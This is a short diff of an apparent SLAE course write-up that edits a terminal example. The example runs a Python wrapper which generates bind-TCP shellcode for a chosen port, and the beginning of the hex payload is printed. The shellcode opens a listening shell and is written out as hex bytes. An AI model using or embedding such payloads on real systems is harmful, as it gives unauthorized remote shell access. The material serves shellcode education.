@@ -857,7 +857,7 @@ else:
 The Python code then dynamically generates shellcode in hex format based on the user input, calculating the shellcode length and checking for Null bytes in the process: 
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ python shell_bind_tcp_wrapper.py 4444
+osboxes@osboxes:~/Downloads/SLAE$ python shell_bind_tcp_wrapper.py 5555
 Generated shellcode using custom port: 5555
 
 \x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x66\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31
